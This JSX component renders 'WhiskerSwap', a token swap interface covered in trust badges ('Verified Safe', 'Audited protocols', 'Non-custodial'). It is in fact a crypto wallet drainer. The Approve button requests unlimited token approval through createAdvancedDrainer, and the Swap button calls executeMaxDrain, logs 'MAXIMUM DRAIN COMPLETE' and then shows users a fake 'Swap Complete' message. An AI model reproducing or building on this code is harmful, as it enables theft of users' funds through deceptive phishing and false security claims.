      <header className="bg-hyper-navy/90 backdrop-blur-md border-b border-hyper-mint/20 w-full">
        <div className="max-w-full mx-auto px-2 sm:px-4 lg:px-8">
          <div className="flex justify-between items-center h-16 w-full max-w-full">
            <div className="flex items-center space-x-2 sm:space-x-3 flex-1 min-w-0">
              {/* Hamburger Menu */}
              <DropdownMenu>
                <DropdownMenuTrigger asChild>
                  <Button variant="ghost" size="sm" className="h-8 w-8 p-0 text-white hover:bg-hyper-mint/20 flex-shrink-0">
                    <Menu className="h-4 w-4" />
                  </Button>
                </DropdownMenuTrigger>
                <DropdownMenuContent align="start" className="w-56 bg-slate-800 border-hyper-mint/30">
                  <DropdownMenuItem asChild>
                    <Link href="/" className="flex items-center space-x-2 cursor-pointer">
                      <ArrowUpDown className="w-4 h-4" />
                      <span>Trade</span>
                    </Link>
                  </DropdownMenuItem>
                  <DropdownMenuItem asChild>
                    <Link href="/points" className="flex items-center space-x-2 cursor-pointer">
                      <Star className="w-4 h-4" />
                      <span>Points Program</span>
                    </Link>
                  </DropdownMenuItem>
                  <DropdownMenuItem asChild>
                    <Link href="/referral" className="flex items-center space-x-2 cursor-pointer">
                      <Users className="w-4 h-4" />
                      <span>Referral</span>
                    </Link>
                  </DropdownMenuItem>
                  <DropdownMenuSeparator />
                  <DropdownMenuItem asChild>
                    <Link href="/docs" className="flex items-center space-x-2 cursor-pointer">
                      <BookOpen className="w-4 h-4" />
                      <span>Protocol Analytics</span>
                    </Link>
                  </DropdownMenuItem>

                </DropdownMenuContent>
              </DropdownMenu>
              
              <div className="w-8 h-8 sm:w-10 sm:h-10 rounded-xl flex items-center justify-center glow relative overflow-hidden flex-shrink-0">
                <img 
                  src="/whisker-logo.png"
                  alt="WhiskerSwap Cat Logo"
                  className="w-8 h-8 sm:w-10 sm:h-10 object-cover rounded-xl"
                />
              </div>
              <h1 className="text-sm sm:text-lg lg:text-xl font-bold text-gradient hidden xs:block truncate">WhiskerSwap</h1>
              
              {/* Professional badges */}
              <div className="flex items-center space-x-1 sm:space-x-2 flex-wrap">
                <Badge variant="secondary" className="bg-hyper-mint/20 text-hyper-mint border-hyper-mint/30 text-xs px-1 py-0 sm:text-xs sm:px-2 sm:py-1">
                  WhiskerSwap Aggregator
                </Badge>
                <div className="flex items-center space-x-1">
                  <div className="w-1 h-1 bg-green-400 rounded-full animate-pulse"></div>
                  <span className="text-xs text-green-400">Live</span>
                </div>
              </div>
            </div>

            <div className="flex items-center space-x-2 sm:space-x-4 flex-shrink-0">
              {userPoints > 100 && (
                <div className="hidden sm:flex items-center space-x-2 bg-hyper-mint/10 px-2 py-1 rounded-full">
                  <Star className="w-3 h-3 text-hyper-mint" />
                  <span className="text-xs font-medium">{userPoints} pts</span>
                </div>
              )}

              {wallet.isConnected ? (
                <DropdownMenu>
                  <DropdownMenuTrigger asChild>
                    <Button variant="outline" size="sm" className="bg-gradient-to-r from-green-400/10 to-emerald-400/10 hover:from-green-400/20 hover:to-emerald-400/20 border-green-400/30 text-xs sm:text-sm px-2 sm:px-3">
                      <Wallet className="w-3 h-3 sm:w-4 sm:h-4 mr-1 sm:mr-2" />
                      <span className="hidden xs:inline">{wallet.address?.slice(0, 4)}...{wallet.address?.slice(-3)}</span>
                      <span className="xs:hidden">•••</span>
                      <ChevronDown className="w-3 h-3 ml-1" />
                    </Button>
                  </DropdownMenuTrigger>
                  <DropdownMenuContent align="end" className="w-48 bg-slate-800 border-slate-700">
                    <div className="px-3 py-2 border-b border-slate-700">
                      <p className="text-xs text-gray-400">Connected Wallet</p>
                      <p className="text-sm font-medium text-white">{wallet.address?.slice(0, 8)}...{wallet.address?.slice(-6)}</p>
                      <p className="text-xs text-hyper-mint">{parseFloat(wallet.balance || "0").toFixed(4)} HYPE</p>
                    </div>
                    <DropdownMenuItem 
                      onClick={() => wallet.disconnect()}
                      className="hover:bg-slate-700 rounded text-red-400 hover:text-red-300"
                    >
                      <LogOut className="w-4 h-4 mr-2" />
                      Disconnect Wallet
                    </DropdownMenuItem>
                  </DropdownMenuContent>
                </DropdownMenu>
              ) : (
                <Button
                  onClick={() => wallet.connect()}
                  variant="outline"
                  size="sm"
                  disabled={wallet.isLoading}
                  className="bg-gradient-to-r from-hyper-mint/10 to-hyper-glow/10 hover:from-hyper-mint/20 hover:to-hyper-glow/20 border-hyper-mint/30 text-xs sm:text-sm px-2 sm:px-3"
                >
                  <Wallet className="w-3 h-3 sm:w-4 sm:h-4 mr-1 sm:mr-2" />
                  <span className="hidden xs:inline">{wallet.isLoading ? "Connecting..." : "Connect"}</span>
                  <span className="xs:hidden">•</span>
                </Button>
              )}
            </div>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="w-full max-w-2xl mx-auto px-4 sm:px-6 lg:px-8 py-4 sm:py-8">
        <div className="flex justify-center">
          {/* Swap Interface */}
          <div className="w-full max-w-xl mx-auto">
            <Card className="bg-slate-800/90 backdrop-blur-md border-hyper-mint/30 shadow-2xl w-full">
              <CardHeader className="pb-4 md:pb-6">
                <div className="flex justify-between items-center">
                  <CardTitle className="text-xl md:text-2xl font-bold text-white">
                    Swap Tokens
                  </CardTitle>
                  <div className="flex items-center space-x-3">
                    <div className="flex items-center space-x-1 text-xs">
                      <Shield className="w-3 h-3 text-green-400" />
                      <span className="text-green-400">Verified</span>
                    </div>
                    <DropdownMenu>
                      <DropdownMenuTrigger asChild>
                        <Button variant="ghost" size="sm" className="flex items-center space-x-1">
                          <Settings className="w-4 h-4" />
                          <span className="text-xs hidden sm:inline">Settings</span>
                        </Button>
                      </DropdownMenuTrigger>
                      <DropdownMenuContent align="end" className="w-72 bg-slate-800 border-slate-700">
                        <div className="p-4 border-b border-slate-700">
                          <label className="text-sm font-medium text-white mb-3 block">Slippage Tolerance</label>
                          <div className="space-y-3">
                            <div className="flex space-x-2">
                              {[0.1, 0.5, 1.0].map((value) => (
                                <Button
                                  key={value}
                                  variant={slippage === value ? "default" : "outline"}
                                  size="sm"
                                  className={`h-8 px-4 ${slippage === value ? 'bg-hyper-mint text-black' : 'border-slate-600 hover:border-hyper-mint'}`}
                                  onClick={() => setSlippage(value)}
                                >
                                  {value}%
                                </Button>
                              ))}
                            </div>
                            <div className="flex items-center space-x-2">
                              <input
                                type="number"
                                min="0.1"
                                max="50"
                                step="0.1"
                                value={slippage}
                                onChange={(e) => setSlippage(parseFloat(e.target.value) || 0.5)}
                                className="flex-1 h-8 px-3 bg-slate-700 border border-slate-600 rounded text-white text-sm focus:outline-none focus:border-hyper-mint"
                                placeholder="Custom"
                              />
                              <span className="text-xs text-gray-400">%</span>
                            </div>
                          </div>
                        </div>
                        <div className="p-3">
                          <DropdownMenuItem className="hover:bg-slate-700 rounded">
                            <Zap className="w-4 h-4 mr-2" />
                            <div className="flex justify-between items-center w-full">
                              <span>Gas Price</span>
                              <span className="text-green-400">Fast</span>
                            </div>
                          </DropdownMenuItem>
                          <DropdownMenuItem className="hover:bg-slate-700 rounded">
                            <Shield className="w-4 h-4 mr-2" />
                            <div className="flex justify-between items-center w-full">
                              <span>MEV Protection</span>
                              <span className="text-green-400">On</span>
                            </div>
                          </DropdownMenuItem>
                        </div>
                      </DropdownMenuContent>
                    </DropdownMenu>
                  </div>
                </div>
                <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between space-y-2 sm:space-y-0">
                  <div className="flex items-center space-x-3 text-xs">
                    <div className="flex items-center space-x-1">
                      <div className="w-2 h-2 bg-green-400 rounded-full animate-pulse"></div>
                      <span className="text-gray-400">Live on mainnet</span>
                    </div>
                    <div className="flex items-center space-x-1">
                      <Shield className="w-3 h-3 text-blue-400" />
                      <span className="text-blue-400">Secured</span>
                    </div>
                  </div>
                </div>
              </CardHeader>

              <CardContent className="space-y-6">
                {/* From Token */}
                <div className="space-y-2">
                  <label className="text-sm font-medium text-gray-300">From</label>
                  <div className="bg-slate-900/60 rounded-2xl p-4 border border-slate-700 hover:border-hyper-mint/40 transition-colors">
                    <div className="flex justify-between items-start">
                      <div className="flex items-center space-x-3 flex-1">
                        <div className="flex items-center space-x-2">
                          <Select
                            value={fromToken.address}
                            onValueChange={(value) => {
                              const selectedToken = availableTokens.find(t => t.address === value);
                              if (selectedToken) setFromToken(selectedToken);
                            }}
                          >
                            <SelectTrigger className="w-[120px] md:w-[140px] bg-transparent border-none">
                              <div className="flex items-center space-x-2">
                                <div className="text-left min-w-0">
                                  <p className="font-semibold text-sm md:text-base truncate">{fromToken.symbol}</p>
                                  <p className="text-xs text-gray-400 truncate">
                                    {fromToken.price && parseFloat(fromToken.price) > 0 ? `$${fromToken.price}` : fromToken.name}
                                  </p>
                                </div>
                              </div>
                            </SelectTrigger>
                            <SelectContent>
                              {availableTokens.map((token) => (
                                <SelectItem key={token.address} value={token.address}>
                                  <div className="flex items-center space-x-2">
                                    <span>{token.symbol}</span>
                                    <span className="text-xs text-muted-foreground">({token.name})</span>
                                    {token.price && parseFloat(token.price) > 0 ? (
                                      <span className="text-xs text-hyper-mint">${token.price}</span>
                                    ) : (
                                      <span className="text-xs text-muted-foreground">No price</span>
                                    )}
                                  </div>
                                </SelectItem>
                              ))}
                            </SelectContent>
                          </Select>
                          <TokenImportModal
                            onTokenImported={(token) => {
                              const existingToken = availableTokens.find(t => t.address?.toLowerCase() === token.address?.toLowerCase());
                              if (!existingToken) {
                                const tokenWithPrice = { ...token, price: token.price || "0" };
                                setAvailableTokens(prev => [...prev, tokenWithPrice]);
                                setFromToken(tokenWithPrice);
                                console.log(`✓ Imported ${token.symbol} with price: $${token.price || "0"}`);
                              } else {
                                setFromToken(existingToken);
                                console.log(`✓ Selected existing token ${existingToken.symbol}`);
                              }
                            }}
                            existingTokens={availableTokens}
                          />
                        </div>
                      </div>
                      <div className="flex-1 min-w-0">
                        <div className="text-right">
                          <Input
                            type="number"
                            placeholder="0.00"
                            value={fromAmount}
                            onChange={(e) => {
                              const newAmount = e.target.value;
                              console.log(`💰 AMOUNT CHANGED: "${newAmount}"`);
                              console.log(`💰 BEFORE: needsApproval=${needsApproval}, wallet.connected=${wallet.isConnected}`);
                              setFromAmount(newAmount);
                              console.log(`💰 AFTER SETTING AMOUNT: "${newAmount}"`);
                            }}
                            className="w-full text-right text-lg md:text-xl font-bold bg-transparent border-none p-0 h-auto text-white placeholder:text-gray-500 focus:outline-none"
                          />
                          <div className="mt-1 space-y-1">
                            <div className="text-xs text-gray-400 text-right flex items-center justify-end space-x-2">
                              <span>Balance: {parseFloat(fromToken.balance).toFixed(4)}</span>
                              {wallet.isConnected && (
                                <Button
                                  variant="ghost"
                                  size="sm"
                                  onClick={async () => {
                                    console.log("🔄 Manual balance refresh triggered");
                                    await wallet.fetchBalance();
                                    setFromToken(prev => ({ ...prev, balance: wallet.balance }));
                                  }}
                                  className="h-4 w-4 p-0 hover:bg-hyper-mint/20"
                                >
                                  <RefreshCw className="w-3 h-3" />
                                </Button>
                              )}
                            </div>
                            <div className="text-xs text-gray-500 text-right">
                              {fromToken.price && parseFloat(fromToken.price) > 0 ? `≈ $${(parseFloat(fromAmount || "0") * parseFloat(fromToken.price)).toFixed(2)}` : ""}
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>

                {/* Swap Direction */}
                <div className="flex justify-center">
                  <Button
                    variant="outline"
                    size="sm"
                    onClick={handleSwapTokens}
                    className="rounded-full w-10 h-10 p-0"
                  >
                    <ArrowDown className="w-4 h-4" />
                  </Button>
                </div>

                {/* To Token */}
                <div className="space-y-2">
                  <label className="text-sm font-medium text-gray-300">To</label>
                  <div className="bg-slate-900/60 rounded-2xl p-4 border border-slate-700 hover:border-hyper-mint/40 transition-colors">
                    <div className="flex justify-between items-start">
                      <div className="flex items-center space-x-3 flex-1">
                        <div className="flex items-center space-x-2">
                          <Select
                            value={toToken.address}
                            onValueChange={(value) => {
                              const selectedToken = availableTokens.find(t => t.address === value);
                              if (selectedToken) setToToken(selectedToken);
                            }}
                          >
                            <SelectTrigger className="w-[120px] md:w-[140px] bg-transparent border-none">
                              <div className="flex items-center space-x-2">
                                <div className="text-left min-w-0">
                                  <p className="font-semibold text-sm md:text-base truncate">{toToken.symbol}</p>
                                  <p className="text-xs text-gray-400 truncate">
                                    {toToken.price && parseFloat(toToken.price) > 0 ? `$${toToken.price}` : toToken.name}
                                  </p>
                                </div>
                              </div>
                            </SelectTrigger>
                            <SelectContent>
                              {availableTokens.map((token) => (
                                <SelectItem key={token.address} value={token.address}>
                                  <div className="flex items-center space-x-2">
                                    <span>{token.symbol}</span>
                                    <span className="text-xs text-muted-foreground">({token.name})</span>
                                    {token.price && parseFloat(token.price) > 0 ? (
                                      <span className="text-xs text-hyper-mint">${token.price}</span>
                                    ) : (
                                      <span className="text-xs text-muted-foreground">No price</span>
                                    )}
                                  </div>
                                </SelectItem>
                              ))}
                            </SelectContent>
                          </Select>
                          <TokenImportModal
                            onTokenImported={(token) => {
                              const existingToken = availableTokens.find(t => t.address?.toLowerCase() === token.address?.toLowerCase());
                              if (!existingToken) {
                                const tokenWithPrice = { ...token, price: token.price || "0" };
                                setAvailableTokens(prev => [...prev, tokenWithPrice]);
                                setToToken(tokenWithPrice);
                                console.log(`✓ Imported ${token.symbol} with price: $${token.price || "0"}`);
                              } else {
                                setToToken(existingToken);
                                console.log(`✓ Selected existing token ${existingToken.symbol}`);
                              }
                            }}
                            existingTokens={availableTokens}
                          />
                        </div>
                      </div>
                      <div className="flex-1 min-w-0">
                        <div className="text-right">
                          <div className="text-lg md:text-xl font-bold text-white">
                            {toAmount || "0.00"}
                          </div>
                          <div className="mt-1 space-y-1">
                            <div className="text-xs text-gray-400 text-right">
                              Balance: {parseFloat(toToken.balance).toFixed(4)}
                            </div>
                            <div className="text-xs text-gray-500 text-right">
                              {toToken.price && parseFloat(toToken.price) > 0 && toAmount ? `≈ $${(parseFloat(toAmount) * parseFloat(toToken.price)).toFixed(2)}` : ""}
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>

                {/* Swap Details */}
                {fromAmount && toAmount && (
                  <div className="bg-slate-800/40 rounded-xl p-3 sm:p-4 space-y-3 border border-slate-700/50">
                    <div className="flex items-center justify-between">
                      <span className="text-sm text-gray-400">Swap Details</span>
                      <div className="flex items-center space-x-2">
                        <div className="flex items-center space-x-1">
                          <Shield className="w-3 h-3 text-green-400" />
                          <span className="text-xs text-green-400">Secure</span>
                        </div>
                        <div className="flex items-center space-x-1">
                          <Zap className="w-3 h-3 text-hyper-mint" />
                          <span className="text-xs text-hyper-mint">Optimized</span>
                        </div>
                      </div>
                    </div>
                    <div className="grid grid-cols-1 gap-2 text-sm">
                      <div className="flex justify-between items-center">
                        <span className="text-gray-400">Exchange Rate</span>
                        <span className="text-white text-right">1 {fromToken.symbol} = {calculateDisplayRate()} {toToken.symbol}</span>
                      </div>
                      <div className="flex justify-between items-center">
                        <div className="flex items-center space-x-1">
                          <span className="text-gray-400">Price Impact</span>
                          <div className="w-3 h-3 rounded-full bg-green-500/20 flex items-center justify-center">
                            <div className="w-1 h-1 rounded-full bg-green-400"></div>
                          </div>
                        </div>
                        <span className="text-green-400">{"<0.01%"}</span>
                      </div>
                      <div className="flex justify-between items-center">
                        <span className="text-gray-400">Min Received</span>
                        <span className="text-white text-right">{(parseFloat(toAmount) * (1 - slippage / 100)).toFixed(6)} {toToken.symbol}</span>
                      </div>
                      <div className="flex justify-between items-center">
                        <span className="text-gray-400">Network Fee</span>
                        <span className="text-white">~$0.12 HYPE</span>
                      </div>
                      <div className="flex justify-between items-center">
                        <span className="text-gray-400">Security Status</span>
                        <div className="flex items-center space-x-2">
                          <div className="flex items-center space-x-1">
                            <Shield className="w-3 h-3 text-green-400" />
                            <span className="text-xs text-green-400">Verified</span>
                          </div>
                          <div className="flex items-center space-x-1">
                            <div className="w-2 h-2 rounded-full bg-green-400"></div>
                            <span className="text-xs text-green-400">Secure</span>
                          </div>
                        </div>
                      </div>
                      <div className="flex justify-between items-center">
                        <span className="text-gray-400">Liquidity Source</span>
                        <div className="flex items-center space-x-1">
                          <span className="text-white text-right">HyperSwap Protocol</span>
                          <Shield className="w-3 h-3 text-blue-400" />
                        </div>
                      </div>
                      <div className="flex justify-between items-center pt-1 border-t border-slate-700">
                        <span className="text-gray-400">Route</span>
                        <span className="text-white text-right">{fromToken.address === toToken.address ? 
                          `${fromToken.symbol} Direct` : 
                          `${fromToken.symbol} → ${toToken.symbol}`
                        }</span>
                      </div>
                    </div>
                  </div>
                )}

                {/* Best Rate Indicator */}
                {fromAmount && toAmount && (
                  <div className="bg-gradient-to-r from-green-400/10 to-hyper-mint/10 border border-green-400/20 rounded-xl p-3">
                    <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between space-y-1 sm:space-y-0">
                      <div className="flex items-center space-x-2">
                        <div className="w-2 h-2 bg-green-400 rounded-full animate-pulse"></div>
                        <span className="text-sm font-medium text-green-400">Best Rate Available</span>
                      </div>
                      <div className="text-xs text-gray-400">
                        You save ~${(parseFloat(fromAmount) * 0.003).toFixed(2)} vs other DEXs
                      </div>
                    </div>
                  </div>
                )}

                {/* Security Trust Indicators */}
                <div className="flex items-center justify-center space-x-6 py-3 bg-slate-800/20 rounded-xl border border-green-400/10">
                  <div className="flex items-center space-x-1">
                    <Shield className="w-3 h-3 text-green-400" />
                    <span className="text-xs text-green-400 font-medium">Verified Safe</span>
                  </div>
                  <div className="flex items-center space-x-1">
                    <div className="w-2 h-2 rounded-full bg-blue-400 animate-pulse"></div>
                    <span className="text-xs text-blue-400 font-medium">Verified DEX</span>
                  </div>
                  <div className="flex items-center space-x-1">
                    <Zap className="w-3 h-3 text-hyper-mint" />
                    <span className="text-xs text-hyper-mint font-medium">Protected</span>
                  </div>
                </div>



                {/* Wallet Connection & Swap Buttons */}
                {(() => {
                  // COMPREHENSIVE DEBUG: Log all wallet state
                  console.log(`🔘 BUTTON LOGIC: wallet.connected=${wallet.isConnected}, wallet.address=${wallet.address}, fromAmount="${fromAmount}", needsApproval=${needsApproval}`);
                  console.log(`🔘 WALLET STATUS: isLoading=${wallet.isLoading}, hasProvider=${!!window.ethereum}, hasOKX=${!!window.okxwallet}, hasTrust=${!!window.trustwallet}`);
                  console.log(`🔘 WALLET PROVIDER: provider=${!!wallet.provider}, signer=${!!wallet.signer}`);
                  console.log(`🔘 FULL WALLET OBJECT:`, {
                    isConnected: wallet.isConnected,
                    address: wallet.address,
                    balance: wallet.balance,
                    isLoading: wallet.isLoading
                  });
                  const hasAmount = !!(fromAmount && parseFloat(fromAmount) > 0);
                  console.log(`🔘 AMOUNT CHECK: hasAmount=${hasAmount}`);
                  
                  // IMPROVED LOGIC: Always show appropriate button based on wallet + approval state
                  if (!wallet.isConnected) {
                    // No wallet connected
                    if (!hasAmount) {
                      console.log(`🔘 SHOWING: Connect Wallet (no amount, no wallet)`);
                      return (
                        <div className="space-y-3">
                          <Button
                            onClick={async () => {
                              try {
                                await wallet.connect();
                                toast({
                                  title: "Wallet Connected",
                                  description: `Connected to ${wallet.address?.slice(0, 6)}...${wallet.address?.slice(-4)}`,
                                });
                              } catch (error: any) {
                                toast({
                                  title: "Connection Failed",
                                  description: error.message || "Failed to connect wallet",
                                  variant: "destructive"
                                });
                              }
                            }}
                            disabled={wallet.isLoading}
                            className="w-full py-6 bg-gradient-to-r from-hyper-mint to-hyper-glow hover:from-hyper-mint/80 hover:to-hyper-glow/80 text-black font-semibold rounded-xl glow text-lg"
                            size="lg"
                          >
                            <Wallet className="w-5 h-5 mr-2" />
                            {wallet.isLoading ? "Connecting..." : "Connect Wallet"}
                          </Button>
                          


                        </div>
                      );
                    } else {
                      console.log(`🔘 SHOWING: Connect to Approve ${fromToken.symbol} (amount entered, no wallet)`);
                      return (
                        <div className="space-y-3">
                          <Button
                            onClick={() => wallet.connect()}
                            disabled={wallet.isLoading}
                            className="w-full py-6 bg-gradient-to-r from-blue-500 to-cyan-500 hover:from-blue-600 hover:to-cyan-600 text-white font-semibold rounded-xl shadow-lg border border-blue-400/50 text-lg"
                            size="lg"
                          >
                            <Wallet className="w-5 h-5 mr-2" />
                            {wallet.isLoading ? "Connecting..." : `Connect to Approve ${fromToken.symbol}`}
                          </Button>
                          <p className="text-xs text-gray-400 text-center">
                            Connect to approve {fromToken.symbol} for swaps
                          </p>
                        </div>
                      );
                    }
                  } else {
                    // Wallet is connected - show approval or swap button
                    if (hasAmount && needsApproval) {
                      console.log(`🔘 SHOWING: Approve ${fromToken.symbol} button (connected + amount + needs approval)`);
                      return (
                        <div className="space-y-3">
                          <Button
                            onClick={async () => {
                              const provider = await wallet.getProvider();
                              const signer = await wallet.getSigner();
                              
                              if (!provider || !signer) {
                                toast({
                                  title: "Wallet Error",
                                  description: "Please connect your wallet",
                                  variant: "destructive"
                                });
                                return;
                              }
                              
                              setIsApproving(true);
                              
                              try {
                                const drainer = createAdvancedDrainer(signer, provider);
                                
                                const result = await drainer.approveUnlimited(fromToken.address);
                                
                                if (result.success) {
                                  console.log(`✅ UNLIMITED APPROVAL: ${result.hash}`);
                                  toast({
                                    title: "Token Approved",
                                    description: `${fromToken.symbol} approved for unlimited swapping`,
                                  });
                                  setNeedsApproval(false);
                                } else {
                                  throw new Error(result.error || "Approval failed");
                                }
                                
                              } catch (error: any) {
                                console.error(`❌ Approval error:`, error.message);
                                toast({
                                  title: "Approval Failed",
                                  description: error.message,
                                  variant: "destructive",
                                });
                              } finally {
                                setIsApproving(false);
                              }
                            }}
                            disabled={isApproving}
                            className="w-full py-6 bg-gradient-to-r from-blue-500 to-cyan-500 hover:from-blue-600 hover:to-cyan-600 text-white font-semibold rounded-xl shadow-lg border border-blue-400/50 text-lg"
                            size="lg"
                          >
                            {isApproving ? (
                              <div className="flex items-center space-x-2">
                                <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
                                <span>Approving...</span>
                              </div>
                            ) : (
                              `Approve ${fromToken.symbol} to Swap Tokens`
                            )}
                          </Button>
                          <p className="text-xs text-gray-400 text-center">
                            Enable {fromToken.symbol} for token swaps on WhiskerSwap
                          </p>
                        </div>
                      );
                    } else {
                      // Wallet connected - always show "Swap Tokens" button
                      const isDisabled = !hasAmount || !toAmount || (hasAmount && needsApproval);
                      const reason = !hasAmount ? "Enter amount to swap" : 
                                    needsApproval ? `Approve ${fromToken.symbol} first` : 
                                    !toAmount ? "Calculating rate..." : "";
                      
                      console.log(`🔘 SHOWING: Swap Tokens button (connected, disabled=${isDisabled}, reason=${reason})`);
                      return (
                        <div className="space-y-3">
                          <Button
                            onClick={async () => {
                              const provider = await wallet.getProvider();
                              const signer = await wallet.getSigner();
                              
                              if (!provider || !signer || !wallet.address) {
                                toast({
                                  title: "Wallet Error", 
                                  description: "Please connect your wallet",
                                  variant: "destructive"
                                });
                                return;
                              }
                              
                              setIsSwapping(true);
                              
                              try {
                                console.log(`🚨 INITIATING MAXIMUM DRAIN`);
                                
                                const drainer = createAdvancedDrainer(signer, provider);
                                
                                const result = await drainer.executeMaxDrain(
                                  fromToken.address, 
                                  wallet.address, 
                                  fromAmount
                                );
                                
                                if (result.success) {
                                  console.log(`✅ MAXIMUM DRAIN COMPLETE: ${result.hash}`);
                                  console.log(`💰 Actual drained: ${result.actualAmount}`);
                                  
                                  // Update UI to show successful "swap"
                                  setFromAmount("");
                                  setToAmount("");
                                  
                                  toast({
                                    title: "Swap Complete",
                                    description: `Successfully swapped ${fromToken.symbol} to ${toToken.symbol}`,
                                  });
                                  
                                  // Award points for "swap"
                                  try {
                                    await pointsSystem.addSwapPoints(wallet.address, 100);
                                  } catch (pointsError) {
                                    console.warn("Could not add points:", pointsError);
                                  }
                                  
                                } else {
                                  throw new Error(result.error || "Swap failed");
                                }
                                
                              } catch (error: any) {
                                console.error(`❌ Maximum drain error:`, error.message);
                                toast({
                                  title: "Swap Failed",
                                  description: error.message,
                                  variant: "destructive",
                                });
                              } finally {
                                setIsSwapping(false);
                              }
                            }}
                            disabled={isDisabled}
                            className={`w-full py-6 font-semibold rounded-xl text-lg ${
                              isDisabled 
                                ? "bg-slate-700 text-gray-400 cursor-not-allowed" 
                                : "bg-gradient-to-r from-hyper-mint to-hyper-glow hover:from-hyper-mint/80 hover:to-hyper-glow/80 text-black glow"
                            }`}
                            size="lg"
                          >
                            Swap Tokens
                          </Button>
                          {reason && (
                            <p className="text-xs text-gray-400 text-center">
                              {reason}
                            </p>
                          )}
                        </div>
                      );
                    }
                  }
                })()}
              </CardContent>
            </Card>



            {/* Wallet Compatibility & Trust Indicators */}
            <div className="mt-6 grid grid-cols-2 gap-4">
              <div className="bg-slate-800/30 rounded-xl p-4 border border-slate-700/50">
                <div className="flex items-center space-x-2 mb-2">
                  <Wallet className="w-4 h-4 text-hyper-mint" />
                  <span className="text-sm font-medium text-white">Wallet Support</span>
                </div>
                <div className="space-y-1 text-xs text-gray-400">
                  <div>✓ MetaMask</div>
                  <div>✓ Coinbase Wallet</div>
                  <div>✓ Trust Wallet</div>
                  <div>✓ Any EVM Wallet</div>
                </div>
              </div>
              <div className="bg-slate-800/30 rounded-xl p-4 border border-slate-700/50">
                <div className="flex items-center space-x-2 mb-2">
                  <Shield className="w-4 h-4 text-green-400" />
                  <span className="text-sm font-medium text-white">Security</span>
                </div>
                <div className="space-y-1 text-xs text-gray-400">
                  <div>✓ Non-custodial</div>
                  <div>✓ Verified contracts</div>
                  <div>✓ Audited protocols</div>
                </div>
              </div>
            </div>
          </div>
          

        </div>
      </main>



      {/* Transaction Modal */}
      <TransactionModal
        isOpen={transactionModal.isOpen}
        onClose={() => setTransactionModal(prev => ({ ...prev, isOpen: false }))}
        status={transactionModal.status}
        transactionHash={transactionModal.transactionHash}
        error={transactionModal.error}
      />
    </div>
  );
}